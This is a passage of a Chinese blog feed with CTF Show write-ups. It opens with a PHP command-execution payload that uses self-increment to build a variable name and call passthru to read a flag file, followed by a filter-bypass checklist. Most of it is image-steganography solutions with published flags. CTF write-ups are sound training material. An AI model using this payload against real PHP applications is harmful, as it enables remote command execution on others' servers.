class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#get?looklook=1#postctf[showamp;_=ls;</span></span><br></pre></td></tr></table></figure><p><strong>长度限制：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># get?looklook=1&amp;1=passthru&amp;2=tac /flag.txt# postctf[show=$_=C;$_++;$C=++$_;$_++;$C_=++$_;$_=(C/C.C)&#123;0&#125;;$_++;$_++;$_++;$_++;$_++;$_=_.$C_.$C.++$_;$&#123;$_&#125;&#123;1&#125;($&#123;$_&#125;&#123;2&#125;);</span></span><br></pre></td></tr></table></figure><h2 id="吃瓜"><a href="#吃瓜" class="headerlink" title="吃瓜"></a>吃瓜</h2><p><img src="https://i.loli.net/2021/08/14/Rn7LtWDXEldPBp3.png" alt="image-20210814215714938"></p><p>50 4B 03 04 ZIP文件</p><p><img src="https://i.loli.net/2021/08/14/KY4lPejVoOUiqbt.png" alt="image-20210814215832498"></p><p><img src="https://i.loli.net/2021/08/14/LiNXRJ9SHnwVtEz.png" alt="image-20210814220223592"></p><p>这是用来迷惑的</p><p>存在一个文本文档，是个 图片，浏览器访问</p><p><img src="https://i.loli.net/2021/08/16/78L6POtr1spjlBE.png" alt="image-20210816210645822"></p><p>扫描得到    cfhwc19abika_etso{h_u_e_ui1}</p><p>查看图片属性</p><p><img src="https://i.loli.net/2021/08/16/M1JngkVhvbPIDOC.png" alt="image-20210816211218664"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">✿❇✼❄✿❇✼❂❃❆✿✽❂❁❉✼==<span class="comment"># 不知道怎末用</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/16/FyR5WpEugQI9ShK.png" alt="image-20210816211549442"></p><h1 id="二、总结"><a href="#二、总结" class="headerlink" title="二、总结"></a>二、总结</h1><h2 id="命令执行做题思路"><a href="#命令执行做题思路" class="headerlink" title="命令执行做题思路"></a>命令执行做题思路</h2><ol><li><p>一眼就有思路的直接掠过</p></li><li><p>一眼没有思路的，首先根据正则的过滤分类，决定思路</p><ul><li><p>有回显？无回显？ eval    exec</p></li><li><p>eval  还是  system</p></li><li><p>无字母数字类？</p><p>异或？或？取反？自增？</p></li><li><p>过滤 ;</p></li><li><p>过滤 ‘ ‘    “ “</p></li><li><p>找 phpinfo() 看被 ban 的函数名</p></li></ul></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;CTF Show 吃瓜杯篇。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF Show" scheme="https://xizhi-future.github.io/categories/CTF-Show/"/>
    
    
    <category term="CTF" scheme="https://xizhi-future.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF-Show-Misc入门</title>
    <link href="https://xizhi-future.github.io/2021/10/01/CTF-Show-Misc%E5%85%A5%E9%97%A8/"/>
    <id>https://xizhi-future.github.io/2021/10/01/CTF-Show-Misc%E5%85%A5%E9%97%A8/</id>
    <published>2021-10-01T11:17:47.000Z</published>
    <updated>2021-10-01T11:18:54.358Z</updated>
    
    <content type="html"><![CDATA[<p>CTF Show Misc 入门篇。</p><span id="more"></span><h1 id="Misc-入门"><a href="#Misc-入门" class="headerlink" title="Misc 入门"></a>Misc 入门</h1><h2 id="1-1-misc-1-—-QQ截图-直接识别图片内容"><a href="#1-1-misc-1-—-QQ截图-直接识别图片内容" class="headerlink" title="1.1 misc 1 — QQ截图 直接识别图片内容"></a>1.1 misc 1 — QQ截图 直接识别图片内容</h2><p><img src="https://i.loli.net/2021/08/06/Rx8sIlWr5dCVMBU.png" alt="image-20210806130402835"></p><p>图片直接是这个，我们可以 QQ 截图，使用当中的 屏幕识别 即可识别出文字</p><h2 id="1-2-misc-2-—-png-图片识别"><a href="#1-2-misc-2-—-png-图片识别" class="headerlink" title="1.2 misc 2 — png 图片识别"></a>1.2 misc 2 — png 图片识别</h2><p><img src="https://i.loli.net/2021/08/06/zi3RJMZBUgDIFV1.png" alt="image-20210806130536818"></p><p>记事本打开是这样，那肯定不是 .txt 文本文件</p><p>使用 Editor010 打开</p><p><img src="https://i.loli.net/2021/08/06/bMwnHSazE6ZumGk.png" alt="image-20210806131136158"></p><p>说明这是 png 文件，修改后缀，然后 QQ 屏幕识图即可</p><p><strong>补充知识：Python3 进行图片识别 <a href="https://segmentfault.com/a/1190000014091417">https://segmentfault.com/a/1190000014091417</a></strong></p><p><img src="https://i.loli.net/2021/08/08/uJiB5lEZkXsd1WG.png" alt="image-20210808212059742"></p><h2 id="1-3-misc-3-—-查看-bpg-图片"><a href="#1-3-misc-3-—-查看-bpg-图片" class="headerlink" title="1.3 misc 3 — 查看 bpg 图片"></a>1.3 misc 3 — 查看 bpg 图片</h2><p>是 bpg 图片，需要专门的查看工具 <a href="https://bellard.org/bpg/">https://bellard.org/bpg/</a></p><p><img src="https://i.loli.net/2021/08/06/ify8sS4qJTQcnHN.png" alt="image-20210806131927979"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用</span></span><br><span class="line">\bpj\bpgview.exe misc3.bpg</span><br></pre></td></tr></table></figure><h2 id="1-4-misc-4-—-图片格式-文件头"><a href="#1-4-misc-4-—-图片格式-文件头" class="headerlink" title="1.4 misc 4 — 图片格式 + 文件头"></a>1.4 misc 4 — 图片格式 + 文件头</h2><p><a href="https://baike.baidu.com/item/%E5%9B%BE%E7%89%87%E6%A0%BC%E5%BC%8F/381122?fr=aladdin">图片格式</a></p><p><strong>JPEG</strong><br>文件头：FF D8 FF　　　　　<br>文件尾：FF D9</p><p><strong>TGA</strong><br>未压缩的前4字节 00 00 02 00<br>RLE压缩的前5字节 00 00 10 00 00</p><p><strong>PNG</strong></p><p>文件头：89 50 4E 47 0D 0A 1A 0A　　　　<br>文件尾：AE 42 60 82</p><p><strong>GIF</strong></p><p>文件头：47 49 46 38 39(37) 61　　　　<br>文件尾：00 3B</p><p><strong>BMP</strong></p><p>文件头：42 4D</p><p>文件头标识(2 bytes) 42(B) 4D(M)</p><p><strong>TIFF (tif)</strong></p><p>文件头：49 49 2A 00</p><p><strong>ico</strong></p><p>文件头：00 00 01 00</p><p><strong>Adobe Photoshop (psd)</strong></p><p>文件头：38 42 50 53</p><p><strong>一个一个查看，修改后缀</strong></p><p>1.txt png</p><p>2.txt jpg</p><p>3.txt bmp</p><p>4.txt gif</p><p>5.txt tif</p><p>6.txt webp</p><h2 id="1-5-misc-5-—-png-文件尾-添内容"><a href="#1-5-misc-5-—-png-文件尾-添内容" class="headerlink" title="1.5 misc 5 — png 文件尾 添内容"></a>1.5 misc 5 — png 文件尾 添内容</h2><p><img src="https://i.loli.net/2021/08/06/TdIf1OWxCinvLR6.png" alt="image-20210806133135512"></p><p>010打开</p><p><img src="https://i.loli.net/2021/08/06/z9YCQkL7JaZKE8t.png" alt="image-20210806133333684"></p><p>发现在 png 的文件尾后面多出了</p><h2 id="1-6-misc-6-—-jpg-文件-添内容"><a href="#1-6-misc-6-—-jpg-文件-添内容" class="headerlink" title="1.6 misc 6 — jpg 文件 添内容"></a>1.6 misc 6 — jpg 文件 添内容</h2><p><img src="https://i.loli.net/2021/08/06/PsSiYcQVTj5Bt1g.png" alt="image-20210806142710191"></p><h2 id="1-7-misc-7-—-flag在图片文件信息中"><a href="#1-7-misc-7-—-flag在图片文件信息中" class="headerlink" title="1.7 misc 7 — flag在图片文件信息中"></a>1.7 misc 7 — flag在图片文件信息中</h2><p><strong>flag在图片文件信息中。</strong></p><p><img src="https://i.loli.net/2021/08/06/FXqw91zIl7HtOfx.png" alt="image-20210806143036016"></p><p><strong>常用到的手段还有</strong></p><ul><li>右键–属性</li><li>工具 <a href="https://exif.tuchong.com/">图虫查看器</a> 能够查看图片的详细信息</li></ul><h2 id="1-8-misc-8-—-flag在图片文件中图片文件中-—-binwalk-foremost"><a href="#1-8-misc-8-—-flag在图片文件中图片文件中-—-binwalk-foremost" class="headerlink" title="1.8 misc 8 — flag在图片文件中图片文件中 — binwalk  foremost"></a>1.8 misc 8 — flag在图片文件中图片文件中 — binwalk  foremost</h2><p><strong>flag在图片文件中图片文件中。</strong></p><p>010 打开</p><p><img src="https://i.loli.net/2021/08/06/SOIugvK2PU5Jql6.png" alt="image-20210806144045544"></p><p>可以发现，该 png 图片当中 还包含着一张 png 图片</p><p><strong>图片隐藏文件 binwalk  foremost</strong></p><p><a href="https://blog.csdn.net/Sc0fie1d/article/details/101602492">https://blog.csdn.net/Sc0fie1d/article/details/101602492</a></p><p><img src="https://i.loli.net/2021/08/06/C3Xg98KxbPEwpD1.png" alt="image-20210806144305711"></p><h2 id="1-9-misc-9-—-flag在图片块里"><a href="#1-9-misc-9-—-flag在图片块里" class="headerlink" title="1.9 misc 9 — flag在图片块里"></a>1.9 misc 9 — flag在图片块里</h2><p><img src="https://i.loli.net/2021/08/06/i9uzv5cNeaIYZK6.png" alt="image-20210806144814605"></p><h2 id="1-10-misc-10-—-flag在图片数据里"><a href="#1-10-misc-10-—-flag在图片数据里" class="headerlink" title="1.10 misc 10 — flag在图片数据里"></a>1.10 misc 10 — flag在图片数据里</h2><p><img src="https://img-blog.csdnimg.cn/2021040323291259.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://i.loli.net/2021/08/06/9fUygEpk5xD64CY.png" alt="image-20210806150628472"></p><p>两个 IDAT 块</p><p><a href="https://blog.csdn.net/wxh0000mm/article/details/85683661">binwalk 工具</a></p><p><img src="https://i.loli.net/2021/08/06/eiTxaH3R5QyXsCM.png" alt="image-20210806145504944"></p><p><img src="https://i.loli.net/2021/08/06/VAtQ7vGkhoydjCg.png" alt="image-20210806145800458"></p><p>解释：zlib 是 PNG IDAT 块数据可选的压缩格式</p><p>题者自己生成了一段 zlib 压缩数据，然后加上长度位、标识位、与 CRC 校验位，将其伪装成了一个 IDAT 块，插在图片当中</p><p>而 binwalk 会自动找到 zlib 块并提取出来解压，所以最终得到的提取结果中就含有 flag 了</p><h2 id="1-11-misc-11-—-flag在另一张图里"><a href="#1-11-misc-11-—-flag在另一张图里" class="headerlink" title="1.11 misc 11 — flag在另一张图里"></a>1.11 misc 11 — flag在另一张图里</h2><p><img src="https://i.loli.net/2021/08/06/TRVfhLlAZtEbz8G.png" alt="image-20210806150503285"></p><p>两个 IDAT 块 </p><p>再次使用上一关的解法，不可行</p><p>搜集资料之后，必须首先将多余的那个 IDAT 块删除才可</p><p>工具 <a href="http://entropymine.com/jason/tweakpng/">tweakpng</a></p><p><img src="https://i.loli.net/2021/08/06/XYpNZg5y4Mrz8ad.png" alt="image-20210806152327628"></p><p>将第一个 IDAT 块右键删除即可</p><p>ctfshow{44620176948fa759d3eeafeac99f1ce9}</p><h2 id="1-12-misc-12-—-flag在另一张图里"><a href="#1-12-misc-12-—-flag在另一张图里" class="headerlink" title="1.12 misc 12 — flag在另一张图里"></a>1.12 misc 12 — flag在另一张图里</h2><p><strong>flag在另一张图里。</strong></p><p>与上一关的做法相同，只不过，不确定删除几个 IDAT 块，每次删完一个保存尝试查看即可</p><h2 id="1-13-misc-13-—-flag位置在图片末尾"><a href="#1-13-misc-13-—-flag位置在图片末尾" class="headerlink" title="1.13 misc 13 — flag位置在图片末尾"></a>1.13 misc 13 — flag位置在图片末尾</h2><p><strong>flag位置在图片末尾。</strong></p><p><img src="https://i.loli.net/2021/08/06/HQLKmqTDYX29ect.png" alt="image-20210806152900284"></p><p>可以看到一部分类似 flag 的字符串</p><p>我们将乱七八糟的删除即可，每隔一个删除一个</p><h2 id="1-14-misc-14-—-flag在那张图里"><a href="#1-14-misc-14-—-flag在那张图里" class="headerlink" title="1.14 misc 14 — flag在那张图里"></a>1.14 misc 14 — flag在那张图里</h2><p><strong>flag在那张图里。</strong></p><p><img src="https://i.loli.net/2021/08/06/MhJSlyqzXk9vTRb.png" alt="image-20210806160143737"></p><p><img src="https://i.loli.net/2021/08/06/DqM6Oeojm84sPCQ.png" alt="image-20210806161032310"></p><p>记得从 FF D8 开始</p><p>新建一个新的文件 jpg 打开</p><p><img src="https://i.loli.net/2021/08/06/M8uZkhLQ3lBrvCq.png" alt="image-20210806161419857"></p><p>注意：QQ识图 有时不准确，比如 0 和 8</p><h2 id="1-15-misc-15-—-flag被跳过去了"><a href="#1-15-misc-15-—-flag被跳过去了" class="headerlink" title="1.15 misc 15 — flag被跳过去了"></a>1.15 misc 15 — flag被跳过去了</h2><p><img src="https://i.loli.net/2021/08/06/ZjgFo1C7Q6vrXa4.png" alt="image-20210806162024516"></p><h2 id="1-16-misc-16-—-flag在图片数据里"><a href="#1-16-misc-16-—-flag在图片数据里" class="headerlink" title="1.16 misc 16 — flag在图片数据里"></a>1.16 misc 16 — flag在图片数据里</h2><p><strong>flag在图片数据里。</strong></p><p>binwalk 提取文件</p><p><img src="https://i.loli.net/2021/08/06/nlOwMb7TYjHvmVa.png" alt="image-20210806162229301"></p><h2 id="1-17-misc-17-—-flag在图片数据里-—-zsteg"><a href="#1-17-misc-17-—-flag在图片数据里-—-zsteg" class="headerlink" title="1.17 misc 17 — flag在图片数据里 — zsteg"></a>1.17 misc 17 — flag在图片数据里 — zsteg</h2><p><strong>flag在图片数据里。</strong></p><p><a href="https://blog.csdn.net/Amherstieae/article/details/107512398?ops_request_misc=&request_id=&biz_id=102&utm_term=zsteg&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-.nonecase&spm=1018.2226.3001.4187">zsteg 安装 及 使用</a></p><blockquote><p><strong>zsteg可以检测PNG和BMP图片里的隐写数据。</strong></p><p><strong>目前，zsteg支持检测：</strong></p><p>LSB steganography in PNG &amp; BMP<br>zlib-compressed data<br>OpenStego<br>Camouflage 1.2.1<br>LSB with The Eratosthenes set</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zsteg misc17.png</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/18/LKIYqbx6zagBPij.png" alt="image-20210818084217889"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zsteg -E <span class="string">&quot;extradata:0&quot;</span> misc17.png &gt; 1.txt</span><br><span class="line">binwalk -e 1.txt</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/18/3Q4ufwqRHpg7sDA.png" alt="image-20210818084305522"></p><h2 id="1-18-misc-18-—-flag在标题、作者、照相机和镜头型号里"><a href="#1-18-misc-18-—-flag在标题、作者、照相机和镜头型号里" class="headerlink" title="1.18 misc 18 — flag在标题、作者、照相机和镜头型号里"></a>1.18 misc 18 — flag在标题、作者、照相机和镜头型号里</h2><p><strong>flag在标题、作者、照相机和镜头型号里。</strong></p><p><img src="https://i.loli.net/2021/08/06/xNsXTekIu8rQicp.png" alt="image-20210806164253394"></p><p>右键属性查看</p><h2 id="1-19-misc-19-—-flag在主机上的文档名里"><a href="#1-19-misc-19-—-flag在主机上的文档名里" class="headerlink" title="1.19 misc 19 — flag在主机上的文档名里"></a>1.19 misc 19 — flag在主机上的文档名里</h2><p><img src="https://i.loli.net/2021/08/06/4x7pI5l6Ji2LXD9.png" alt="image-20210806164624752"></p><h2 id="1-20-misc-20-—-flag在评论里"><a href="#1-20-misc-20-—-flag在评论里" class="headerlink" title="1.20 misc 20 — flag在评论里"></a>1.20 misc 20 — flag在评论里</h2><p><strong>图虫查看器</strong> </p><p><a href="https://exif.tuchong.com/">https://exif.tuchong.com/</a></p><p><img src="https://i.loli.net/2021/08/06/vmXoFLcraHVux81.png" alt="image-20210806164933737"></p><p>ctfshow{c97964b1aecf06e1d79c21ddad593e42}</p><h2 id="1-21-misc-21-—-flag在序号里"><a href="#1-21-misc-21-—-flag在序号里" class="headerlink" title="1.21 misc 21 — flag在序号里"></a>1.21 misc 21 — flag在序号里</h2><p><strong>flag在序号里。</strong></p><p><img src="https://i.loli.net/2021/08/06/fZSn92xQVupkjm8.png" alt="image-20210806165515702"></p><p><img src="https://i.loli.net/2021/08/06/UhKEkJ1cCenrjBW.png" alt="image-20210806165604429"></p><p><img src="https://i.loli.net/2021/08/06/GAKM9qvI2wHXZdy.png" alt="image-20210806165842984"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(hex(3902939465)+hex(2371618619)+hex(1082452817)+hex(2980145261))</span><br><span class="line">0xe8a221490x8d5c073b0x4084eb510xb1a1686d</span><br></pre></td></tr></table></figure><p>删掉 0x 即可</p><h2 id="1-22-misc22-—-flag-在图片里-—-缩略图-—-exiftool"><a href="#1-22-misc22-—-flag-在图片里-—-缩略图-—-exiftool" class="headerlink" title="1.22 misc22 — flag 在图片里 — 缩略图 — exiftool"></a>1.22 misc22 — flag 在图片里 — 缩略图 — exiftool</h2><p><img src="https://i.loli.net/2021/08/18/s3uYmaIvdQoCntb.png" alt="image-20210818085210755"></p><p>设置为平铺之后，可以依稀看出来该图片下方有着黄色的一行，但是点击查看之后又看不出来</p><p><strong>这是一种缩略图隐写的方式，叫做thumbnail隐写</strong></p><p><a href="https://blog.csdn.net/qq_41453285/article/details/101765775?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162924833616780274173567%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=162924833616780274173567&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-3-101765775.first_rank_v2_pc_rank_v29&utm_term=exiftool&spm=1018.2226.3001.4187">exiftool</a></p><p><img src="https://i.loli.net/2021/08/18/lh2CPzr7Icn6ETL.png" alt="image-20210818090550904"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool.exe -ThumbnaiImage -b misc22.jpg &gt; 111.jpg</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/18/f2B4y1Vlg7C9TkU.png" alt="image-20210818091200925"></p><p>ctfshow{dbf7d3f84b0125e833dfd3c80820a129}</p><h2 id="1-23-misc23-—-flag在时间里-—"><a href="#1-23-misc23-—-flag在时间里-—" class="headerlink" title="1.23 misc23 — flag在时间里 —"></a>1.23 misc23 — flag在时间里 —</h2><p>exiftool 查看实践</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool.exe misc23.psd</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/18/pmdsDHbnO78GAKE.png" alt="image-20210818091639071"></p><p> ctfshow{}, UnixTimestamp, DECtoHEX, getflag</p><p>Unix 时间戳，十进制到十六进制，获取 flag</p><p>1997:09:22 02:17:02+08:00</p><p>2055:07:15 12:14:48+08:00</p><p>2038:05:05 16:50:45+08:00</p><p>1984:08:03 18:41:46+08:00</p><p><a href="">在线时间戳转换</a></p><p><img src="https://i.loli.net/2021/08/18/yxjk3vDiorTaS7F.png" alt="image-20210818092609921"></p><p>874865822</p><p>2699237688</p><p>2156662245</p><p>460377706</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(hex(874865822)+hex(2699237688)+hex(2156662245)+hex(460377706))</span><br><span class="line">0x3425649e0xa0e319380x808c0de50x1b70ce6a</span><br></pre></td></tr></table></figure><p>ctfshow{3425649ea0e31938808c0de51b70ce6a}</p><h2 id="1-24-misc41"><a href="#1-24-misc41" class="headerlink" title="1.24 misc41"></a>1.24 misc41</h2><p><strong>（本题为Misc入门图片篇和愚人节比赛特别联动题）</strong><br><strong>H4ppy Apr1l F001’s D4y！<br>愚人节到了，一群笨蛋往南飞，一会儿排成S字，一会儿排成B字。</strong></p><p>H4ppy Apr1l F001’s D4y！</p><p>这是个提示：F001，010 搜索 F001，发现存在大量，组成了刺目的形状，读取出来即可</p><p><img src="https://i.loli.net/2021/08/18/iQu4oTsBpj5VSbK.png" alt="image-20210818093403414"></p><p>ctfshow{fcbd427caf4a52f1147ab44346cd1cdd}</p><h2 id="1-25-misc24-—-flag在图片上面-—-bmp-图片改高度"><a href="#1-25-misc24-—-flag在图片上面-—-bmp-图片改高度" class="headerlink" title="1.25 misc24 — flag在图片上面 — bmp 图片改高度"></a>1.25 misc24 — flag在图片上面 — bmp 图片改高度</h2><p><a href="https://blog.csdn.net/aidem_brown/article/details/80500637">bmp 位图文件解析</a></p><p>900*150=135000个像素大小</p><p>该图片总共 675056 个字节，文件尾的位置在675053字节处(后面两个字节是windows的”<strong>补0</strong>”)</p><p>文件头共 53 字节</p><p><strong>每个像素点由3个字节（十六进制码6位）表示，每个字节负责控制一种颜色，分别为蓝（Blue）、绿（Green）、红（Red）</strong></p><p>(675053-53)/3=225000</p><p>得到真实的像素大小</p><p>该题只有高不对，则正确的宽依旧是 900</p><p>得到 225000/900=高 250</p><p>修改高为 hex(250)=FA</p><p><img src="https://i.loli.net/2021/08/18/NGuDSj1aL6Ii9vo.png" alt="image-20210818122344260"></p><p>还是 0096 的位置修改</p><p><img src="https://i.loli.net/2021/08/18/X9QjZ8bHJ2oUc7x.png" alt="image-20210818122451730"></p><p>保存得到flag</p><h2 id="1-26-misc25-—-flag在图片下面-—-png-图片改高度"><a href="#1-26-misc25-—-flag在图片下面-—-png-图片改高度" class="headerlink" title="1.26 misc25 — flag在图片下面 — png 图片改高度"></a>1.26 misc25 — flag在图片下面 — png 图片改高度</h2><p><img src="https://i.loli.net/2021/08/18/Yn7Ss6BOiae3mZ2.png" alt="image-20210818094843932"></p><p>0096 改成 0196 0296 都可</p><p><img src="https://i.loli.net/2021/08/18/XGi2Mk35UJRTBcq.png" alt="image-20210818094920712"></p><h2 id="1-27-misc26-—-flag还是在图片下面，但到底有多下面？"><a href="#1-27-misc26-—-flag还是在图片下面，但到底有多下面？" class="headerlink" title="1.27 misc26 — flag还是在图片下面，但到底有多下面？"></a>1.27 misc26 — flag还是在图片下面，但到底有多下面？</h2><p><img src="https://i.loli.net/2021/08/18/U2a1CMOwjg7eoFQ.png" alt="image-20210818095156426"></p><p>ctfshow{94aef1</p><p>+True height(hex) of this picture+</p><p>087a7ccf2e28e742efd704c}</p><p><img src="https://i.loli.net/2021/08/18/nFv9oAalI6by3CG.png" alt="image-20210818095534774"></p><p><a href="https://blog.csdn.net/weixin_44145452/article/details/109612189">https://blog.csdn.net/weixin_44145452/article/details/109612189</a></p><p>会提示校验码错误</p><p><strong>CRC32是有哪些字节构成的</strong>？</p><p>PNG文件中总是以固定的八个字节开头</p><blockquote><p> 89 50 4E 47  0D 0A 1A 0A</p></blockquote><p>数据块长度3</p><blockquote><p>00 00 00 0D</p></blockquote><p>文件头数据块标示IDCH</p><blockquote><p>49 48 44 52</p></blockquote><p>13位数据块（IHDR）<br>下面为宽和高</p><blockquote><p>00 00 07 7E  00 00 03 60</p></blockquote><p>这5个字节依次为Bit depth，ColorType，Compression method，Filter method，Interlace method</p><blockquote><p>08 06 00 00 00</p></blockquote><p>接下来的四字节为该png图片的CRC校验码</p><blockquote><p>7D C7 3F 7F</p></blockquote><p>CRC校验码，由IDCH和IHDR共十七位字节进行crc计算得到</p><p><strong>解决方法：</strong><br>1.简单点的隐写题，可以直接修改宽高，然后显示flag<br>2.那么如果修改宽高，并不会直接看到flag，需要放入stegsolve里或者做其它的进一步处理时。<br>这里会产生一个问题，那就是修改过宽高的图片stegsolve无法打开，提示IO错误。<br>这是因为png图像的IHDR段中的高宽被修改，导致计算出来的CRC不正确，所以无法正确读取。<br>通过python2脚本来获取图片高度</p><p><strong>获取图片高度</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">import binascii</span><br><span class="line">import struct</span><br><span class="line">crc32key = 0x7DC73F7F</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(0, 65535):</span><br><span class="line">  height = struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i)</span><br><span class="line">  <span class="comment">#CRC: 7DC73F7F</span></span><br><span class="line">  data = <span class="string">&#x27;\x49\x48\x44\x52\x00\x00\x07\x7E&#x27;</span> + height + <span class="string">&#x27;\x08\x06\x00\x00\x00&#x27;</span></span><br><span class="line">  crc32result = binascii.crc32(data) &amp; 0xffffffff</span><br><span class="line">  <span class="keyword">if</span> crc32result == crc32key:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.join(map(lambda c: <span class="string">&quot;%02X&quot;</span> % ord(c), height))</span><br></pre></td></tr></table></figure><p><strong>爆破图片正常宽高</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import structimport zlibdef hexStr2bytes(s):    b = b<span class="string">&quot;&quot;</span>    <span class="keyword">for</span> i <span class="keyword">in</span> range(0,len(s),2):        temp = s[i:i+2]        b +=struct.pack(<span class="string">&quot;B&quot;</span>,int(temp,16))    <span class="built_in">return</span> bstr1=<span class="string">&quot;49484452&quot;</span>         <span class="comment">#文件头数据块标示IDCHstr2=&quot;0806000000&quot;       #五字节：Bit depth，ColorType，Compression method，Filter method，Interlace methodbytes1=hexStr2bytes(str1)bytes2=hexStr2bytes(str2)wid,hei = 900,150       #宽高 像素crc32 = &quot;0xec9ccbc6&quot;    #校验码for w in range(wid,wid+2000):    for h in range(hei,hei+2000):        width = hex(w)[2:].rjust(8,&#x27;0&#x27;)        height = hex(h)[2:].rjust(8,&#x27;0&#x27;)        bytes_temp=hexStr2bytes(width+height)        if eval(hex(zlib.crc32(bytes1+bytes_temp+bytes2))) == eval(crc32):            print(hex(w),hex(h))</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/18/YDhUVyJfuWLqTHG.png" alt="image-20210818100740105"></p><p>ctfshow{94aef1</p><p>+True height(hex) of this picture+</p><p>087a7ccf2e28e742efd704c}</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;94aef125e087a7ccf2e28e742efd704c&#125;</span><br></pre></td></tr></table></figure><h2 id="1-28-misc27-—-flag在图片下面"><a href="#1-28-misc27-—-flag在图片下面" class="headerlink" title="1.28 misc27 — flag在图片下面"></a>1.28 misc27 — flag在图片下面</h2><p><img src="https://i.loli.net/2021/08/18/lJOhAfSi9oUprB4.png" alt="image-20210818102436038"></p><p>寻找 0096</p><h2 id="1-29-misc28-—-flag在图片下面-—-gif"><a href="#1-29-misc28-—-flag在图片下面-—-gif" class="headerlink" title="1.29 misc28 — flag在图片下面 — gif"></a>1.29 misc28 — flag在图片下面 — gif</h2><p>9600 更改为 FF00，两处</p><p><img src="https://i.loli.net/2021/08/18/ORvZCma3I9obkwW.png" alt="image-20210818103453893"></p><p>gif.bt  ???????</p><h2 id="1-30-misc29-—-flag在图片下面"><a href="#1-30-misc29-—-flag在图片下面" class="headerlink" title="1.30 misc29 — flag在图片下面"></a>1.30 misc29 — flag在图片下面</h2><p>9600 更改为 FF00，十处，然后 stegsolve 逐帧查看</p><p><img src="https://i.loli.net/2021/08/18/28FwOXBWE71SrjL.png" alt="image-20210818104202161"></p><h2 id="1-31-misc30-—-正确的宽度是950"><a href="#1-31-misc30-—-正确的宽度是950" class="headerlink" title="1.31 misc30 — 正确的宽度是950"></a>1.31 misc30 — 正确的宽度是950</h2><p>修改 bmp 宽度为 hex(950)</p><p><img src="https://i.loli.net/2021/08/18/78twlxqsrMUOHTj.png" alt="image-20210818122816045"></p><h2 id="1-32-misc31-—-高度是正确的，但正确的宽度是多少呢"><a href="#1-32-misc31-—-高度是正确的，但正确的宽度是多少呢" class="headerlink" title="1.32 misc31 — 高度是正确的，但正确的宽度是多少呢"></a>1.32 misc31 — 高度是正确的，但正确的宽度是多少呢</h2><p>同 misc24</p><p>图片总共 487256 字节，去掉文件尾，得到 487253</p><p>900*150=135000</p><p>文件头 53 字节</p><p>(487253-53)/3=162400</p><p>高正确，150</p><p>宽：162400/150=1082.67</p><p>改宽为 1082</p><h2 id="1-33-misc32-—-高度是正确的，但正确的宽度是多少呢"><a href="#1-33-misc32-—-高度是正确的，但正确的宽度是多少呢" class="headerlink" title="1.33 misc32 — 高度是正确的，但正确的宽度是多少呢"></a>1.33 misc32 — 高度是正确的，但正确的宽度是多少呢</h2><p>png 计算宽高</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import structimport zlibdef hexStr2bytes(s):    b = b<span class="string">&quot;&quot;</span>    <span class="keyword">for</span> i <span class="keyword">in</span> range(0,len(s),2):        temp = s[i:i+2]        b +=struct.pack(<span class="string">&quot;B&quot;</span>,int(temp,16))    <span class="built_in">return</span> bstr1=<span class="string">&quot;49484452&quot;</span>         <span class="comment">#文件头数据块标示IDCHstr2=&quot;0802000000&quot;       #五字节：Bit depth，ColorType，Compression method，Filter method，Interlace 